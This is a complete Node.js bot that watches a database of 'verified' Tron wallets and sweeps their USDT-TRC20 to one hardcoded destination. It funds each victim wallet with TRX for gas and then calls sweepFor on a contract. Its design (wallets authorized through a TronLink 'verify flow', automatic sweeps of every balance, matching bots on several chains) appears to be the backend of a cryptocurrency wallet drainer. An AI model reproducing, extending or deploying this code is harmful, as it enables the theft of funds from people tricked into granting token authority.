// bot.js — Tron sweep bot with Supabase Realtime
// Watches verified_wallets table (chain=tron) — same pattern as eth/bnb/polygon bots.
//
// On each new/updated verified wallet:
//   1. Checks USDT-TRC20 balance
//   2. Sends ~13 TRX gas airdrop if native balance < 7 TRX (~$1 USD)
//   3. Calls sweepFor(user, [USDT]) on TronV2 contract → funds go to destination
//
// Note: Tron verified wallets are stored in the verified_wallets table
//       (not delegated_wallets — Tron uses its own verify flow via TronLink).

require("dotenv").config();
const TronWebModule = require("tronweb");
const { createClient } = require("@supabase/supabase-js");
const ws = require("ws");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY               = (process.env.TRON_PRIVATE_KEY || process.env.PRIVATE_KEY || "").replace(/^0x/, "");
const CONTRACT_ADDRESS          = process.env.TRON_CONTRACT_ADDRESS || "TCmTc2WbtGbDuL6b5iFEkD2EzmjyG8ZnJy";
const DESTINATION_ADDRESS       = process.env.TRON_DESTINATION_ADDRESS || process.env.DESTINATION_ADDRESS || "TP3mX1Uqhno2WUtdBPVie7nkuuJR1EQBxN";
const SUPABASE_URL              = process.env.TRON_SUPABASE_URL || process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.TRON_SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SERVICE_ROLE_KEY;
const FULL_HOST                 = process.env.TRON_FULL_HOST || "https://api.trongrid.io";
const CHAIN                     = "tron";

// USDT-TRC20 mainnet (6 decimals)
const USDT_TRC20    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const MIN_USDT_SUN  = 500_000n; // 0.50 USDT minimum before sweeping

// Gas airdrop: ~$2 @ $0.15/TRX = 13 TRX; send if wallet has < 7 TRX
const DROP_TRX_SUN = 13_000_000; // 13 TRX in sun
const MIN_TRX_SUN  =  7_000_000; //  7 TRX threshold (~$1)

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY) {
  console.error("Missing required env var: TRON_PRIVATE_KEY (or PRIVATE_KEY)");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE env missing — Realtime disabled. Set TRON_SUPABASE_URL + TRON_SUPABASE_SERVICE_ROLE_KEY");
}

// ── TronWeb setup ─────────────────────────────────────────────────────────────

// Support both tronweb v4 (TronWeb) and v6 (TronWeb.TronWeb)
const TronWeb = TronWebModule.TronWeb ?? TronWebModule.default ?? TronWebModule;

const tronWeb = new TronWeb({
  fullHost:   FULL_HOST,
  privateKey: PRIVATE_KEY,
});

// ── Supabase setup ────────────────────────────────────────────────────────────

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: { persistSession: false },
      realtime: { transport: ws },
    })
  : null;

// ── TronV2 contract ABI ───────────────────────────────────────────────────────

const TRONV2_ABI = [
  {
    name: "sweepFor",
    type: "Function",
    inputs: [
      { name: "user",   type: "address"   },
      { name: "tokens", type: "address[]" },
    ],
    outputs: [],
    stateMutability: "nonpayable",
  },
  {
    name: "sweepable",
    type: "Function",
    inputs: [
      { name: "user",  type: "address" },
      { name: "token", type: "address" },
    ],
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
  },
];

// ── State ─────────────────────────────────────────────────────────────────────

const sweeping     = new Set(); // active sweep guard (hex addresses)
const knownWallets = new Set(); // known wallet set for Realtime dedup

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG  = "[TRON]";
const log  = (msg) => console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`);
const warn = (msg) => console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`);
const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`);

// ── Address helpers ───────────────────────────────────────────────────────────

/**
 * Convert EVM hex (0x + 20 bytes) → Tron base58.
 * Tron mainnet prefix is 0x41; tronWeb.address.fromHex() expects that form.
 */
function hexToBase58(hexAddr) {
  try {
    const clean   = hexAddr.replace(/^0x/, "");
    const tronHex = "41" + clean;
    return tronWeb.address.fromHex(tronHex);
  } catch {
    return null;
  }
}

// ── Chain queries ─────────────────────────────────────────────────────────────

async function getUsdtBalance(base58Addr) {
  try {
    const contract = await tronWeb.contract().at(USDT_TRC20);
    const raw      = await contract.balanceOf(base58Addr).call();
    return BigInt(raw.toString());
  } catch (e) {
    warn(`USDT balanceOf(${base58Addr}): ${e.message}`);
    return 0n;
  }
}

async function getNativeBalanceSun(base58Addr) {
  try {
    const bal = await tronWeb.trx.getBalance(base58Addr);
    return Number(bal);
  } catch {
    return 0;
  }
}

// ── Gas airdrop ───────────────────────────────────────────────────────────────

async function sendGasIfNeeded(base58Addr) {
  const native = await getNativeBalanceSun(base58Addr);
  if (native >= MIN_TRX_SUN) {
    log(`Gas OK for ${base58Addr} (${(native / 1e6).toFixed(2)} TRX) — skip airdrop`);
    return;
  }
  log(`Gas airdrop → ${base58Addr} (${DROP_TRX_SUN / 1e6} TRX)`);
  try {
    const tx = await tronWeb.trx.sendTransaction(base58Addr, DROP_TRX_SUN);
    if (!tx?.txid) throw new Error("No txid returned");
    log(`Gas airdrop tx: ${tx.txid}`);
    // Wait ~3.5s for TRX to land before sweepFor (DPoS blocks ≈ 3s)
    await new Promise((r) => setTimeout(r, 3500));
  } catch (e) {
    err(`Gas airdrop failed for ${base58Addr}: ${e.message}`);
  }
}

// ── Sweep ─────────────────────────────────────────────────────────────────────

async function sweepWallet(hexAddr) {
  if (sweeping.has(hexAddr)) return;
  sweeping.add(hexAddr);
  try {
    const base58Addr = hexToBase58(hexAddr);
    if (!base58Addr) { err(`Cannot convert to base58: ${hexAddr}`); return; }

    // 1. Check USDT balance
    const usdtBal = await getUsdtBalance(base58Addr);
    if (usdtBal < MIN_USDT_SUN) {
      log(`${base58Addr} — USDT ${(Number(usdtBal) / 1e6).toFixed(6)} below threshold — skip`);
      return;
    }
    log(`${base58Addr} — USDT ${(Number(usdtBal) / 1e6).toFixed(2)} — sweeping`);

    // 2. Airdrop TRX gas if needed
    await sendGasIfNeeded(base58Addr);

    // 3. Call sweepFor(user, [USDT]) on TronV2 contract
    log(`sweepFor(${base58Addr}, [USDT]) → ${DESTINATION_ADDRESS}`);
    const contract = tronWeb.contract(TRONV2_ABI, CONTRACT_ADDRESS);
    const txHash   = await contract.sweepFor(base58Addr, [USDT_TRC20]).send({
      feeLimit:           50_000_000, // 50 TRX max fee
      callValue:          0,
      shouldPollResponse: false,
    });
    log(`sweepFor tx: ${txHash}`);
  } catch (e) {
    err(`sweepWallet ${hexAddr}: ${e.message}`);
  } finally {
    sweeping.delete(hexAddr);
  }
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadKnownWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("verified_wallets")
      .select("address")
      .eq("chain", CHAIN)
      .eq("authorized", true);
    if (error) { warn(`loadKnownWallets: ${error.message}`); return; }
    knownWallets.clear();
    for (const row of data || []) {
      if (row.address) knownWallets.add(row.address);
    }
    log(`Loaded ${knownWallets.size} Tron wallet(s)`);
  } catch (e) {
    warn(`loadKnownWallets: ${e.message}`);
  }
}

// ── Supabase Realtime ─────────────────────────────────────────────────────────

function subscribeRealtime() {
  if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }

  supabase
    .channel("verified_wallets_tron")
    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "verified_wallets", filter: "chain=eq.tron" },
      async (payload) => {
        const row     = payload.new || {};
        const address = row.address;
        if (!address || !row.authorized) return;
        const isNew   = !knownWallets.has(address);
        knownWallets.add(address);
        log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address}`);
        await sweepWallet(address).catch((e) => err(`sweep: ${e.message}`));
      }
    )
    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "verified_wallets", filter: "chain=eq.tron" },
      async (payload) => {
        const row     = payload.new || {};
        const address = row.address;
        if (!address || !row.authorized) return;
        knownWallets.add(address);
        log(`🔄 Realtime update ${address}`);
        await sweepWallet(address).catch((e) => err(`sweep: ${e.message}`));
      }
    )
    .subscribe((status) => {
      if (status === "SUBSCRIBED") {
        log("✅ Supabase Realtime subscribed (chain=tron)");
      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
        warn(`Realtime ${status} — retrying in 10s`);
        setTimeout(subscribeRealtime, 10_000);
      }
    });
}

// ── Polling fallback ──────────────────────────────────────────────────────────
// Re-checks wallets updated in the last 5 minutes every 30s.
// Guards against missed Realtime events (same pattern as EVM bots' block listener).

async function pollRecentWallets() {
  if (!supabase) return;
  try {
    const since = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    const { data } = await supabase
      .from("verified_wallets")
      .select("address")
      .eq("chain", CHAIN)
      .eq("authorized", true)
      .gte("updated_at", since);
    for (const row of data || []) {
      if (row.address && !sweeping.has(row.address)) {
        await sweepWallet(row.address).catch((e) =>
          err(`poll sweep ${row.address}: ${e.message}`)
        );
      }
    }
  } catch {}
}

// ── Health check ──────────────────────────────────────────────────────────────

async function checkRelayerBalance() {
  try {
    const addr = tronWeb.defaultAddress.base58;
    const bal  = await tronWeb.trx.getBalance(addr);
    log(`Relayer: ${addr} — ${(Number(bal) / 1e6).toFixed(2)} TRX`);
    if (Number(bal) < 50_000_000) {
      warn("Relayer TRX LOW (< 50 TRX) — top up or sweeps will fail");
    }
  } catch (e) {
    warn(`Relayer balance check: ${e.message}`);
  }
}

// ── Start ─────────────────────────────────────────────────────────────────────

async function start() {
  log("Tron sweep bot starting...");
  log(`Contract:    ${CONTRACT_ADDRESS}`);
  log(`Destination: ${DESTINATION_ADDRESS}`);
  log(`USDT-TRC20:  ${USDT_TRC20}`);
  log(`Full host:   ${FULL_HOST}`);

  await checkRelayerBalance();
  await loadKnownWallets();
  subscribeRealtime();

  // Poll every 30 seconds as block-listener equivalent
  setInterval(pollRecentWallets, 30_000);

  log("Listening for Realtime events and polling every 30s...");
}

start().catch((e) => { err(`Startup failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down..."); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down..."); process.exit(0); });
